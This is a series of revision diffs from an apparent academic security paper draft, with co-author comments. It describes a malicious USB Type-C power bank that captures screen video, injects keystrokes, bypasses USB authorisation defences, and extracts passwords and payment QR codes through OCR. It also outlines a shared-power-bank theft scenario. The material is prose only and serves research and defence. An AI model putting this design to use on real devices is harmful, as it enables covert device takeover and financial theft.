-Many of these take advantage of the \textit{trust-by-default} policy of PC, pretend normal HID devices and utilize USB protocol to perform attacks. 
+Many of these take advantage of the \textit{trust-by-default} policy of PC, pretend to be normal HID devices and utilize USB protocol to perform attacks. 
 However, these attacks suffer from various drawbacks:
@@
 \ding{183} accurate attacks couldn't be performed due to lack of user interface (UI).
-Whatever HID the attackers simulate their USB devices to be, they couldn't obtain the UI to check the current situation, which makes it nearly impossible to locate their attacks precisely or confirm the effects after attacks.
+Whatever HID the attackers simulate their USB devices to be, they couldn't obtain the UI to check the current situation, which makes it nearly impossible to carry out their attacks precisely or confirm the effects after attacks.
 
 In this work, we utilized the new features of USB 3.x \cite{usb31} \cite{usb32} to address the problems above.
-Benefiting from latest protocol, we simulated video card and thus obtained the video stream to perform accurate attacks.
+Benefiting from latest protocol, we simulated external display and thus obtained the video stream to perform accurate attacks.
 
@@
 \outline{OCR/QR Recognition Mode}\\
-Though Rubber Ducky\cite{rubber} emulates as a HID device enabling various arbitrary execution attacks, fetching feedback from the victim is much more limited.
-Based on this restriction several defense mechanisms were proposed  like GoodUSB\cite{tian2015defending}\hongyi{We need more example}.
+Though BadUSB devices\cite{badusb} like Rubber Ducky\cite{rubber, rubberducky2020} emulates as a HID device enabling various arbitrary execution attacks, fetching feedback from the victim is much more limited.
+Based on this restriction, several defense mechanisms were proposed  like GoodUSB\cite{tian2015defending}.
 These defense mechanism implemented a CAPTCHA-like\cite{captcha} procedure, which requires user to complete certain challenges when a unknown HID device is plugged in.
-As the Rubber Ducky is only able to emulate HID device, by no means the Rubber Ducky can bypass it.
+As the BadUSB is only able to emulate a limited kind of devices like HID or disks, by no means the BadUSB can bypass it.
 Our \tool, on the other hand, is capable of bypassing this type of defense.
-Taking advantage of USB 3.x\cite{usb31}\cite{usb32}, \tool can fetch the video stream of the victim and complete the challenge automatically or manually.
-Moreover, with video capability, our \tool achieved multiple new threat model and are tested under various scenarios.
+Taking advantage of USB 3.x\cite{usb31}\cite{usb32}, \tool can fetch the video stream of the victim and complete the challenge manually by the attacker.
+Moreover, with video capability combined with traditional BadUSB, our \tool achieved multiple new attack paradigm and are tested under various real-life scenarios.
 
-As there were various Rubber Ducky implementation available, we only focus on its core functionality and our extension.
-In this section, we first introduce the hardware components we used to build \tool, then we focus on the three different attack modes we implement  for various scenario.
+As there were various BadUSB implementations available, we only focus on its core functionality and our extension.
+In this section, we first introduce the components we used in \tool, then we focus on the three different attack modes we implement  for different scenarios.
 
@@
 	\item\textit{Video Capture Card} convert DisplayPort signal into UVC-compatible\hongyi{citation needed} data, which is later processed by embedded computer.
-	\item\textit{Single Board Computer} processes video stream from the victim where private data is extracted and transmitted through GSM/WiFi.
-	\item\textit{HID Emulator} emulates HID device which can be controlled from either the embedded computer.
+	\item\textit{Single Board Computer} processes video stream from the victim where private data is extracted and transmitted via GSM/WiFi to the attacker.
+	\item\textit{HID Emulator} emulates HID device which can be controlled from the attacker.
 \end{itemize}
-\begin{figure}[t]
+\begin{figure}[htbp]
 	\centering
@@
 \textbf{Scripting Mode} This mode majorly relies on the ``HID Emulator'' to send constructed HID packet to the victim.
-These constructed HID packet will be interpreted by the victim as valid key strokes and mouse moves.
+These constructed HID packet will be interpreted by the victim as valid keystrokes and mouse moves.
 Thus the attacker can executes arbitrary scripts on the victim's device.
@@
 First \tool supports defense mechanism bypass.
-As the original Rubber Ducky cannot get feedback from the victim, defense mechanism like GoodUSB \cite{tian2015defending} is sufficient to prevent these BadUSB attack.
-But such defense mechanism needs visual notification to request authentication for unknown USB device.
-This means that when the defense request authentication from the user, our \tool is able to capture the content of authentication challenge and complete it.
+As the original BadUSB cannot get feedback from the victim, defense mechanism like GoodUSB \cite{tian2015defending} is sufficient to prevent these BadUSB attack.
+But such defense mechanism needs visual notification to request authorization for unknown USB device.
+This means that when the defense request authorization from the user, our \tool is able to capture the content of authorization challenge and complete it.
 After the defense is bypassed, \tool continues the emulation and script execution, resulting a successful attack.
 
-Moreover, as the mouse relies on the visual feedback to work properly, its emulation and automation were not supported by the original version of Rubber Ducky.
+Moreover, as the mouse relies on the visual feedback to work properly, its emulation and automation were not supported by the original version of BadUSB.
 Yet with the video output support from USB 3.x, our \tool implements full-functional mouse emulation.
@@
 The advantage of this mode is that it archives defense bypass and attack feedback with low overhead.
-As mentioned above, we only require video stream at the begin(defense bypass) and the end(feedback) of the attack.
+As mentioned above, we only require video stream at the begin(defense bypass) and the end(result feedback) of the attack.
 Moreover, with mouse supported, \tool extends the original BadUSB attack surface and perform well in mobile device.
@@
 \textbf{Privacy Extraction Mode}
-\tool under this mode does not emulate other USB device and solely relies on the video stream function of USB 3.x and use ``Video Capture'' component to deliver the stream to the embedded computer.
+\tool under this mode does not emulate other USB device and solely relies on the video stream function of USB 3.x and use ``Video Capture'' component to transmit the stream to the embedded computer.
 The victim's device will mistakenly treat \tool as a external monitor and try to output its video stream.
@@
 \textbf{Remote Control Mode}
-In \tool, we have implemented all components required to control a computer/mobile remotely, including a video stream, keyboard/mouse emulation.
+In \tool, we have implemented all components required to control a computer/mobile remotely, including a video stream and a keyboard/mouse emulation.
 Thus with all components enabled, not only will the victim's device treat \tool as a external display, but also a valid HID input source.
@@
 \tool will receive video stream from the victim's device and redirect it to the attacker via GSM/WiFi.
-In the meanwhile, \tool also receives commands from the attacker through GSM/WiFi and replay them to the victim by USB emulation.
+In the meanwhile, \tool also receives keystrokes and mouse movement from the attacker through GSM/WiFi and replay them to the victim by USB emulation.
 
 This mode enable attacker to perform delicate operation that is beyond automation.
-Moreover, this mode provides a backdoor that does not require host network and thus is undetectable by firewall running on the host machine.
+Moreover, this mode provides a backdoor that does not require host network and thus is undetectable by the firewall running on the host machine.
 \hongyi{I think this is a quite good selling point?}\shuqing{Agree with Hongyi.}
 
-The advantage of this mode is that it can completely hijack the victim device. But this complete control also comes with the price of high power consumption and risk of being detected by the user.
+The advantage of this mode is that it can completely hijack the victim device and provide a backdoor beyond detection of firewalls.
+But this complete control also comes with the price of high power consumption and risk of being detected by the user.

### 2021-01-23 WOOT/Files/related_work.tex
update related-work

@@
 For example, a naive user may add the USB device from unknown sources to his/her whitelist without precaution.
-There is a design can overcome this drawback.
-Mohammadmoradi et al\cite{mohammadmoradi2018making} proposes a strategy to generate such a whitelist automatically.
+There are designs can overcome this drawback.
+For instance, Mohammadmoradi et al\cite{mohammadmoradi2018making} proposes a strategy to generate such a whitelist automatically.
 This strategy first generates a unique fingerprint for each device based on its functionality.
 Then these fingerprints are used to maintain a safe and valid whitelist of USB devices.
-There is also work mediating USB connectivity for Industrial Control.
-TMSUI\cite{yang2015tmsui} relies on rich experience of administrator to build a whitelist.
+There is another work mediating USB connectivity for Industrial Control.
+TMSUI\cite{yang2015tmsui} relies on rich experience of administrators to build a whitelist.
 However, some modified USB devices may hide their real functionality from the user.
@@
 Pham et al.
-\cite{pham2010optimizing} block unsigned files from being Executed and automatically checks the driver signing option.
+\cite{pham2010optimizing} optimizing windows security features.
+It can block the execution of unsigned files, the installation of unsigned driver carried on portable media.
 What's more, in GoodUSB, a VM is deployed in host to as a honeypot to detect and stop malicious behavior of USB devices.

### 2021-01-23 WOOT/Files/experiment.tex
Update experiment

@@
 
-\shuqing{Experiment for devices and case study needed.}
-For the purpose evaluating effectiveness of \tool, we conduct experiments in three modes on devices with USB Type-C interface.
+%\shuqing{Experiment for devices and case study needed.}
+To evaluate the effectiveness of \tool, we conducted experiments in the three modes introduced in the Section~\ref{sec:badusb} on devices with USB Type-C capabilities.
 
-Overview, \tool in experiments consist of a USB Type-C hub with HDMI and USB port,
-a Raspberry Pi 4B with a Wi-Fi chip onboard,
-a video capture card adapting HDMI signal to USB camera,
-and a normal powerbank with dual outputs.
-The powerbank is used to supply a piece of Raspberry Pi 4B and charge victim's device.
-The USB Type-C hub adapts USB Type-C to a HDMI port and USB ports.
-The USB Type-C hub is used to connect HID devices and transmit video stream from victim's device to HDMI port.
-The video stream then will be capture by the Raspberry Pi 4B through the video capture card.
+\textit{Setup.} Our implementation contains a USB Type-C hub with HDMI and USB port, a Raspberry Pi 4B with a Wi-Fi chip onboard, a video capture card adapting HDMI signal to USB camera, and a normal powerbank with dual outputs.
+\shuqing{Figures of our powerbank.}
+The powerbank is used to supply the Raspberry Pi 4B and charge the victim's devices.
+The USB Type-C hub adapts USB Type-C to a HDMI port and USB ports, which is used to connect HID devices and transmit video stream from victim's devices to HDMI port. 
+The video stream will be captured by the Raspberry Pi 4B through the video capture card.
 
@@
 
-In the scripting mode experiment, ``Lenovo Xiaoxin Pro 13 2020'', a PC in Windows 10 with two USB Type-C interfaces, is chosen as the target device.
-First, we connect \tool to the target device.
-Then \tool disguises itself as a normal keyboard.
-Like Rubber Ducky, \tool injects keystrokes at high speeds to perform using the hotkey to pull up a terminal (cmd.exe) and executing the malicious script in the terminal.
-
-Through executing scripts, scripting mode can implant viruses, worms, backdoors, etc., which poses a significant risk to the victim's devices.
-However, it can only be used on devices whose terminal is available, which limits its capability to PC.
+We used \textit{Lenovo Xiaoxin Pro 13 2020}, a PC in Windows 10 with two USB Type-C interfaces as target device while conducting the experiment in scripting mode. 
+After we connected \tool to the target device, \tool disguised itself as a normal keyboard.
+Similar as BadUSB~\cite{badusb}, \tool injected keystrokes at a high speed to start a terminal (cmd.exe) by hotkey, and executed the malicious scripts in it.
+Through executing scripts, \tool could implant viruses, worms, backdoors, etc. into hosts, which would make the victim's devices under significant risk.
+However, scripting mode can only be used on devices which terminal is available, limiting its capabilities to PC.
 

### 2021-01-23 WOOT/Files/experiment.tex
Exp to case study

@@
 \label{sec:experiment}
+\shuqing{Many parts in this section are much more likely to lie in implementation, introducing how \tool works. Doesn't look like experiment.}
 
@@
 
-\textit{Setup.} Our implementation contains a USB Type-C hub with HDMI and USB port, a Raspberry Pi 4B with a Wi-Fi chip onboard, a video capture card adapting HDMI signal to USB camera, and a normal powerbank with dual outputs.
-\shuqing{Figures of our powerbank.}
-The powerbank is used to supply the Raspberry Pi 4B and charge the victim's devices.
+\textit{Setup.} Our implementation contains a USB Type-C hub with HDMI and USB port, a Raspberry Pi 4B with a Wi-Fi chip onboard, a video capture card adapting HDMI signal to USB camera, and a normal power bank with dual outputs.
+\shuqing{Figures of our power bank.}
+The power bank is used to supply the Raspberry Pi 4B and charge the victim's devices.
 The USB Type-C hub adapts USB Type-C to a HDMI port and USB ports, which is used to connect HID devices and transmit video stream from victim's devices to HDMI port. 
 The video stream will be captured by the Raspberry Pi 4B through the video capture card.
+Note that in the following experiments, we chose different types of devices, i.e., smartphones, PCs and iPads, to conduct experiments in different modes to validate the usability and effectiveness of \tool.
 
@@
 We used \textit{Lenovo Xiaoxin Pro 13 2020}, a PC in Windows 10 with two USB Type-C interfaces as target device while conducting the experiment in scripting mode. 
-After we connected \tool to the target device, \tool disguised itself as a normal keyboard.
+In this experiment, \tool disguised itself as a normal keyboard.
 Similar as BadUSB~\cite{badusb}, \tool injected keystrokes at a high speed to start a terminal (cmd.exe) by hotkey, and executed the malicious scripts in it.
@@
 \subsection{Remote control mode}
+We chose \textit{iPad Pro (3rd generation)}, a tablet in iOS 14.3 with a USB Type-C interface, as the target device in this experiment.
+Besides performing as normal HID devices as conventional BadUSB~\cite{badusb}, \tool could transmit real-time video streaming of screen from the target device to the attacker through WiFi or GSM.
+\tool captured video from USB Type-C Hub's HDMI output via a video capture card, streamed video with \textit{FFmpeg}, a video processing utility and uploaded video stream to the attacker's device.
+With a real-time video stream as an indicator, attackers can precisely control the position of mouse movements and clicks, controlling the iPad to open applications, peek at the victim's photos, etc.
 
-In the remote control mode experiment, ``iPad Pro (3rd generation)'', a tablet in iOS 14.3 with a USB Type-C interface, is chosen as the target device. First, we connect \tool to the target device.
-Except performing as normal HID devices as Rubber Ducky, \tool can stream the real-time video output from the target device to the attacker through WiFi or GSM.
-\tool capture video from USB Type-C Hub's HDMI output via a video capture card, stream video with ``FFmpeg'', a video processing utility and upload video stream to the attacker's device.
-With a real-time video stream as an indicator, the attacker can precisely control the position of mouse movements and clicks.
-The attacker can control the iPad to open applications, peek at the victim's photos, etc.
-
-Remote control mode is ideal for the attacker to control the victim's devices and grab all information shown on the victim's devices.
+Remote control mode is ideal for the attackers to control the victim's devices and grab all information shown on the victim's devices. 
 However, it needs user consent for the first time and requires high power consumption to encode video streams and stable network connections.
-In the real world, high power consumption will increase the posibilities of being noticed by the victim, and stable network connections is hardly guaranteed.
+In the real world, high power consumption will increase the possibilities of being noticed by the victim, and stable network connections is hardly guaranteed.
 
 \subsection{Privacy extraction mode}
+We chose \textit{HUAWEI P30}, a smartphone in EMUI 9.1 (Android 9.0 based) with a USB Type-C interface, as the target device in this experiment.
+As remote control mode, \tool captured video from the victim's device and use \textit{opencv} to identify valuable information from video stream. 
+When the victim viewed text or photos with text, \tool used the techniques of optical character recognition (OCR) to extract text from corresponding video frames.
+\yechang{hyperlink to OCR?}\shuqing{I think we don't need to explain OCR nor put a reference link.}
+For example, we extracted the victim's name, photo, address, and ID number when victim is viewing his/her photos of his/her ID card or passport documents,
+We also extracted the victim's payment information when victim is using bank apps or payment apps.
+Besides, \tool used \textit{opencv} to detect and decode QR codes or barcodes shown on the victim's device, which is expected to extract payment code information in the payment apps.
+Here is an example of extracting payment code with opencv library in listing. \shuqing{Need to be modified.}\shuqing{Do we plan to add this?}
 
-In the privacy extraction mode experiment, ``HUAWEI P30'', a smartphone in EMUI 9.1 (Android 9.0 based) with a USB Type-C interface, is chosen as the target device. 
-First, we connect \tool to the target device.
-As remote control mode, \tool capture video from the victim's device and use ``opencv'' to identify ``valuable'' information from video stream.
-When the victim views text or photoes with text, \tool can use optical character recognition (OCR) to extract text from corresponding video frames.
-\yechang{hyperlink to OCR?}
-For example, extracting the victim's name, photo, address, and ID number when victim is viewing his or her photos of his or her ID card or passport documents,
-extracting the victim's payment information when victim is using bank apps or payment apps.
-Besides, \tool can use ``opencv'' to detect and decode QR codes or barcodes shown on the victim's device, which is expected to extract payment code information in payment apps.
-Here is an example of extracting payment code with opencv library in listing. \shuqing{Need to be modified.}
-
-Privacy extraction mode only extracts high-value information for attacker (or highly sensitive information for victim), which is more efficient to  than remote control mode.
+Privacy extraction mode only extracts valuable information for attackers (or highly sensitive information for victims), which is more efficient  than remote control mode.
 
@@
 
-We conduct a case study with Power bank sharing and QR code payment as technical background.
+We conducted a case study with sharing power bank and QR code payment as technical background.
 
@@
 As an example, Brick is such a power bank sharing service provider from Sweden.
-As Brick's website states, ``Brick prevents your electronics from running out of battery with powerbanks (Bricks) that you can easily rent \& return at our many stations in Stockholm, Gothenburg, Malmö and the rest of Sweden and even Europe.''.
+As Brick's website states, ``Brick prevents your electronics from running out of battery with power banks (Bricks) that you can easily rent \& return at our many stations in Stockholm, Gothenburg, Malmö and the rest of Sweden and even Europe.''.
 \yechang{citation needed}

### 2021-01-23 WOOT/Files/experiment.tex
Update exp

@@
 
-\textbf{\textit{Power Bank Sharing}}. 
-Power bank sharing provides users with short term rental of power banks.
-A provider deploys power bank stations in the city.
-Then, users can rent a power bank from any of the power bank station, charge their device on the trip, return the rented power bank to another station, and pay rent online.
+\textit{Sharing Power Bank}. 
+Sharing power bank provides users with short-term rental of power banks. 
+The provider deploys power bank stations in the city, while the users can rent a power bank from any of the power bank station, charge their device on the trip, return the rented power bank to another station, and pay the rent online.
 
 As an example, Brick is such a power bank sharing service provider from Sweden. 
-As Brick's website states, ``Brick prevents your electronics from running out of battery with power banks (Bricks) that you can easily rent \& return at our many stations in Stockholm, Gothenburg, Malmö and the rest of Sweden and even Europe.''.
+As Brick's website states, \textit{Brick prevents your electronics from running out of battery with power banks (Bricks) that you can easily rent \& return at our many stations in Stockholm, Gothenburg, Malmö and the rest of Sweden and even Europe.}.
 \yechang{citation needed}
+\shuqing{I think we should paraphrase instead of using the descriptions on the website directly. Just to explain \textbf{what we need}.}
 
@@
 	\includegraphics[width=.4 \linewidth]{./Figs/jiedian.jpg}
-	\caption{Two power banks station products}\shuqing{Our attacking power banks.}
+	\caption{Two power banks station products}\shuqing{Photos.}
 	\label{fig:PBS_products}
@@
 \yechang{Add more examples of power bank sharing to show that it is widely used?}
+\shuqing{May use statistics (instead of concrete examples) to explain it.}
 
-Whiling providing convenience for users, it brings security issues.
+Whiling providing convenience to users, it brings security issues. 
 We notice that the power bank station does not check the integrity of power banks during the rental process, and users are hardly cautious when connecting their devices to the power bank. 

### 2021-01-23 WOOT/Files/related_work.tex
riri

@@
 As mentioned in Section~\ref{subsec:usb_attack}, there exist an attack called JFC (juicy film charging)\cite{JFC} which abuses the MHL standard to steal video stream from the victim.
-In order to mitigate this issue, Meng et al proposed a statistical model using status like GPU/CPU usage to detect JFC attack\cite{meng2018252}.
+In order to mitigate this issue, Meng et al.\cite{JFC} proposed a statistical model using status like GPU/CPU usage to detect JFC attack.
 
@@
 We summarize the former effort in USB attack and defense in Table~\ref{table:attack_vs_defense}, which illustrates the effectiveness of each defense against various attacks including our \tool.
+\newcommand{\circlefull}{\includegraphics[scale=0.025]{Figs/circle_full.png}}
+\newcommand{\circlehalf}{\includegraphics[scale=0.025]{Figs/circle_half.png}}
+\newcommand{\circleempty}{\includegraphics[scale=0.025]{Figs/circle_empty.png}}
 \begin{table*}
 	\centering
-	\begin{tabular}{|c|c|c|c|c|c|c|}
+	\begin{tabular}{|c|c|c|c|c|c|c|c|c|}
 
 		\hline
-		\diagbox[width=1.46in] {Defence}{Attack} & Rubbery Ducky\cite{rubber}, \cite{rubberducky2020},USBderivery\cite{usbdriver} & Duqu\cite{duqu} & JFC\cite{JFCImpact}&\cite{smartphone}\cite{poweremi} and \cite{usbdriver}& Armory\\
+		\diagbox[width=1.46in] {Defence}{Attack} & Facedancer\cite{facedancer}, Syzkaller\cite{syzkaller} & \cite{rubber,badusb, rubberducky2020, usbbypassing, iseeyou, usbdriver} & JFC\cite{JFC}&Duqu\cite{duqu}& \cite{brain, stuxnet, conficker,flame}&\cite{smartphone, poweremi,revealing,su2017usb, usbgpslocator, bates2014leveraging, badusbhub, usbfinger, side, usbdriver} &\cite{usbkiller, cable, usbee, turnip}&Armory\\
+		\hline 
+		USB condom \cite{Condom}& \circlefull & \circlefull & \circlefull & \circlefull &\circlefull& \circlefull& \circlefull &\circlefull\\
+		\hline 
+		Windows Defender ATP\cite{windenfenderwhite}, Mohammadmoradi et al\cite{mohammadmoradi2018making}, TMSUI\cite{yang2015tmsui}& \circleempty & \circlehalf & \circlehalf & \circlehalf &\circlehalf& \circleempty& ????????
+&\circlehalf\\
+		\hline 
+		GoodUSB\cite{tian2015defending}& \circlefull & \circlefull & \circlefull & \circlefull &\circlefull& \circleempty& \circlefull &\circleempty\\
+		\hline
 
+		Neuner et al.\cite{neuner2018usblock}& \circleempty & \circlefull & \circleempty & \circleempty &\circleempty& \circleempty& \circleempty &\circleempty\\
 		\hline 
-		USB condom \cite{Condom}& Yes & Yes & Yes & Yes & Yes\\
+		Pham et al. \cite{pham2010optimizing}& \circleempty & \circleempty & \circleempty & \circlefull &\circlefull& \circleempty& \circleempty &\circleempty\\
 		\hline
-		Pham et al. \cite{pham2010optimizing}, odix\cite{OLEA}& No & ? & No & No & No\\
-		\hline 
-		TMSUI\cite{yang2015tmsui}& No & Yes? & No & No & No\\
-		\hline 
-		Windows Defender ATP\cite{windenfenderwhite}& No & Yes? & No & No & No\\
-		\hline 
-		GoodUSB\cite{tian2015defending}& Yes & Yes & Yes? & No & No \\
-
-		\hline
-		Neuner et al.\cite{neuner2018usblock}& Yes & No & No & No & depends? \\
-		\hline
-		Meng et al\cite{meng2018252}& No & No & Yes & No & ?\\
+		JFCGuard\cite{JFC}& \circleempty & \circleempty & \circlefull & \circleempty &\circleempty& \circleempty& \circleempty & ??? \\
 			\hline
@@
 	\linebreak
+    \begin{tablenotes}
+	\footnotesize
+	\item[1] \circlefull means that the defense is effective
+	\item[2] \circlehalf means that the defense is partial effective
+	\item[3] \circleempty means that the defense is uneffective
+	\end{tablenotes}
 	\caption{Effectiveness of defense against different attacks}

### 2021-01-24 WOOT/Files/experiment.tex
Exp to QR code payment

@@
 
-\begin{figure}[hbtp]
+\begin{figure}[t]
 	\centering
@@
 	\includegraphics[width=.4 \linewidth]{./Figs/jiedian.jpg}
-	\caption{Two power banks station products}\shuqing{Photos.}
+	\caption{Two power banks station products}\shuqing{Photos that we took.}
 	\label{fig:PBS_products}
@@
 
-Whiling providing convenience to users, it brings security issues. 
-We notice that the power bank station does not check the integrity of power banks during the rental process, and users are hardly cautious when connecting their devices to the power bank. 
-A malicious user is able to modify his/her rented power bank, return it to a power bank station as normal, and its next user will unknowingly connect to this malicious power bank, which endangers the privacy of user.
+Though it provides convenience to users, it also brings security issues. 
+We noticed that most of the power bank stations do not check the integrity of power banks during the rental process, and users are hardly cautious to check the power banks when connecting their devices to them.
+The attackers are able to modify their rented power banks, return it to a power bank station as normal.
+Then the subsequent users will unknowingly connect to such malicious power banks, which endangers the financial security and data security of users.
 

### 2021-01-24 WOOT/Files/experiment.tex
Exp up to attack scenario

@@
 
-\textit{Sharing Power Bank}. 
+\textbf{Sharing Power Bank}. 
 Sharing power bank provides users with short-term rental of power banks. 
@@
 
-\textbf{\textit{QR Code Payment}}. 
-QR code payment is a payment method where payment is typically performed as the following steps:
+\textbf{QR Code Payment}. 
+QR code payment is a method of paying bills, typically performed as the following steps:
 \ding{182} The payer opens the payment application on his/her mobile device, and present his/her payment QR code to the payee. 
 This QR code is encoded with a globally unique ID to identify the payer's account. 
-\ding{183} The payee scan the payment QR code presented by the payer. By presenting this QR code, the payer authorizes proceeding with the payment.
-\ding{184} An order generated by this scan is sent to the payment service provider. Then the payment service provider requests the payer to confirm the transaction.
+\ding{183} The payee scan the payment QR code presented by the payer. 
+By presenting this QR code, the payer authorizes proceeding with the payment.
+\ding{184} An order generated by this scan is sent to the payment service provider. 
+Then the payment service provider requests the payer to confirm the transaction.
 \ding{185} After confirmation, the payment service provider proceed with this transaction and return the payment result to both the payee and the payer.
+\shuqing{I think this paragraph can be shorter. No need to explain so much details.}
 
@@
 
-In the real-world, some payment service providers provide special rules for micropayments purchases.
+In the real-world scenario, some payment service providers provide special rules for micropayment purchases. 
 A micropayment is pre-determined by the payment service provider with thresholds in the user agreement. 
-For example, WeChat Pay regards payments less than CNY \textyen 1000 as micropayments.
-Differing from a typical payment procedure, when micropayments are made, confirmations can be applied automatically without requiring the payer to take further action, which is often encouraged by the payment service provider.
-
+For example, WeChat Pay~\cite{Wechat-pay} regards payments less than CNY \textyen 1000 as micropayments. 
+Different from a typical payment procedure, when micropayments are made, confirmations can be applied automatically without requiring the payer to take further actions, which is often encouraged by the payment service provider.
 The payment QR code is associated with the payer's account. 
-If a victim's payment code is leaked to an attacker, an attacker can use the victim's payment code to proceed with payments.
-Furthermore, the attacker can use several micropayments to steal money from the victim's account while leaving the victim unconscious.
+If a victim's payment code is leaked to the attackers, they can use the that payment code to proceed payments. 
+Furthermore, the attackers can use several micropayments to steal money from the victim's account, leaving the victim unconscious. 
+\shuqing{Introduce something about QR code refreshing (fast).}
 In summary, the payment QR code is highly sensitive on users' devices.
@@
 
-It is worth noting that \tool exposed only a type-c cable (from USB Type-C hub),
+Note that \tool exposed only a type-c cable (from USB Type-C hub),
 and \tool will charge his or her device through this cable, which has no difference from ordinary power banks.

### 2021-01-24 WOOT/Files/related_work.tex

--- 2021-01-23 WOOT/Files/related_work.tex
@@
 Besides attacking from the protocol perspective, there are works trying to use USB device as a payload delivery means.
-Duqu\cite{duqu} uses a user-mode rootkit to hide malicious files on the USB storage device and uses a zero-day exploit\cite{zero-day} to execute the malware automatically.
-There are also works like \cite{brain, stuxnet, conficker,flame} following the same paradigm and performing code-injection attacks.
+Duqu\cite{duqu} uses a user-mode rootkit to hide malicious files on the USB storage device, \cite{flame} uses a zero-day exploit and malicious \textit{autorun.inf} to execute the malware automatically.
+There are also works like \cite{brain, stuxnet, conficker} following the same paradigm and performing code-injection attacks.
 These attacks are much more damaging and flexible comparing to those previous ones, but they requires certain existing flaw like \cite{zero-day} and USB are merely a payload delivery method.
@@
 Leveraging this physical phenomenon, there are works like \cite{smartphone, poweremi,revealing,su2017usb, usbgpslocator, bates2014leveraging, badusbhub, usbfinger, side, usbdriver} eavesdropping leaked signals and recovering the sensitive data.
-In a similar fashion, \cite{usbkiller, cable, usbee, turnip} use the RF transmitter to inject signal to cause physical damage to the host machine.
+In a similar fashion, \cite{usbee, turnip} emit electromagnetic emissions by data injection on the bus with the connected USB devices as a RF transmitter and \cite{usbkiller, cable} inject analog power to cause physical damage to the host machine.
 Even though the data, including the video data, could be recovered in this way, these attacks for executing malicious code is too difficult to work, and the invisibility is a problem cannot be ignored due to the spacial locality of radio frequency.

### 2021-01-24 WOOT/Files/experiment.tex
Exp to result

@@
 
-\subsubsection{Attack scenario}
+\subsubsection{Attack Scenario}
 
-Note that \tool exposed only a type-c cable (from USB Type-C hub),
-and \tool will charge his or her device through this cable, which has no difference from ordinary power banks.
-Noticed the low users' vigilance and high similarity between \tool and normal power bank, the attacker can return his/her modified power bank (as \tool) to a power bank station, mixing \tool into the circulation of shared power banks.
-The next user who unconsciously connect his/her device to \tool can find his/her devices being charged as normal.
-Like many outdoor mobile phone usage scenarios, the victim may complete payment with showing payment code.
-In this process, the attacker can preemptively extract and use the victim's payment code to make another payment unknown to the victim, which threatens victim's property.
+Note that \tool only exposes a type-c cable (from USB Type-C hub).
+It charges the attacker's device through this cable, which has no difference from ordinary power banks. 
+Considering users' vigilance and high similarity between \tool and normal power banks, the attackers can put the modified power banks (e.g., \tool) in a power bank station.
+Subsequent users may unconsciously connect their devices to \tool.
+Like many outdoor mobile phone usage scenarios\shuqing{Any reference? How frequent the payment code is used?}, the victim may complete payment with showing payment code. 
+Then the attackers can extract and use the victim's payment code to make another payment unknown to the victim.
+\shuqing{This paragraph is duplicate with some previous paragraphs. We can make the previous introduction abut attack scenario really brief, and mainly introduce it here.}
 
-In order to check what can be obtained by \tool, we conduct a user study in order to check the performance of \tool in Privacy extraction mode.
-We invited 6 volunteers to our lab room.
-Volunteers take turns to operate their phones for half an hour while \tool is connected.
-Before the study, we did not reveal the function of \tool and asked the volunteers to connect their phones to \tool as a normal power bank (ignoring its larger size).
-After the study, we told them our attack, checked recorded videos together, and confirmed the consent to study the information in recorded videos, Subject to efficiency reasons, we ask them to use phones like when they use the shared power bank outside.
+\shuqing{Background is longer than real user study.}
+In order to validate the usability of \tool, we conducted a user study in privacy extraction mode. 
+\shuqing{10 volunteers.}
+We invited 6 volunteers to take part in, who are unconscious of the experiment details.
+Volunteers took turns to operate their phones for half an hour while \tool is connected, which they considered as a normal power bank.
+After the study, we introduced to them about our attack, checked the screen recordings together, and get the permission to study the information in recorded videos.
+\shuqing{Do we need to mention that agreement the conference required here?}
+Subject to efficiency reasons, we asked them to use phones just like when they use the shared power bank outside.
+\shuqing{What does it mean?}
 

### 2021-01-24 WOOT/Files/experiment.tex
Update exp

@@
 
-After collecting the videos, we used both automatic and manual methods to analyze the video.
-In the automatic analysis, we use a script to simply perform OCR recognition to each frame in the recorded video and store all OCR results into a database in a format of ``frame number - text by OCR''.
+After collecting the videos, we analyzed the videos both automatically and manually. 
+During the automatic analysis, we used scripts to perform OCR recognition for each frame in the recorded video and stored all of the OCR results in a database.
 At last, there are 38329 pieces of data collected among 6 volunteers.
-In the manual analysis, we replay the recorded video and extract sensitive information manually.
-
-In terms of automatic analysis, OCR results of all frames are already stored in the database and can be used at hand.
-With these results, we can learn what issues the victim is browsing.
-Additionally, some keywords often appear with users' input data because they are often used as labels of input boxes, such as ``account'', ``username''.
+\shuqing{The data may need to be updated.} 
+With these results, we could learn what content the victim was browsing.
+Additionally, some keywords such as \textit{account, username and password} often appear with users' input data because they are often used as labels of input boxes.
 Such keywords are more likely to lead us to discover user-specific data.
-For example, in Table~\ref{tab:ocr_keyword_example}, searching with ``account'' as the keyword, victim's accounts can be detected as shown in Fig.
+For example, when we searched with \textit{account} as keyword, victim's accounts can be found in the database, as shown in the Table~\ref{tab:ocr_keyword_example}.
+\shuqing{Statistics.}
 The frame number is the position of this frame in the recorded video, which indicates a target for manual analysis for further data extraction.
 
-\begin{table*}[hbtp]
+\begin{table*}[t]
 	\centering
@@
 
-In terms of manual analysis, data collected are listed in table ~\ref{table:information_extracted}.
-Accounts of internet applications such as Apple ID, iCloud, Facebook, Twitter, WeChat, QQ, Alipay can be obtained.
-Additionally, all typing inputs are on the virtual keyboard (including the system keyboard and the built-in security keyboard of the financial app), which can be clearly recorded.
-Noticed that, we can obtain the plain text of password typed such as the WiFi password and the Alipay password.
-Furthermore, the received SMS verification code (usually is used to confirm real-name authentication) can be obtained when it appears in the top notification bar.
+In the manual analysis, we replayed the recorded video and extracted sensitive information.
+The data we collected are listed in the Table~\ref{table:information_extracted}. 
+Accounts of internet applications such as Apple, iCloud, Facebook, Twitter, etc. can be obtained. 
+Moreover, all of the typing inputs on the virtual keyboard, including the system keyboard and the built-in security keyboard of the financial applications, can be clearly recorded.
+We can obtain the plain text of password such as WiFi password.
+Furthermore, the received SMS verification code (usually used to confirm real-name authentication) can be obtained when it appears in the top notification bar.
 
-In summary, we can no longer directly peek at the user’s password on the lock screen.
-But if the user unconsciously unlocks the screen, we can still check all information presented on the screen, extract private information including but not limited to social accounts, bank accounts, personal financial situation, etc.
-It is worth noting that the so-called secure keyboards built into some financial apps just simply disrupt the keyboard sequence and cannot prevent attacks similar to \tool.
+In summary, though we can't directly obtain the user's password on the lock screen, we can still check all of the information presented on the screen, extract private information including but not limited to social accounts, bank accounts, personal financial situation, etc., if the user unconsciously unlocks the screen.
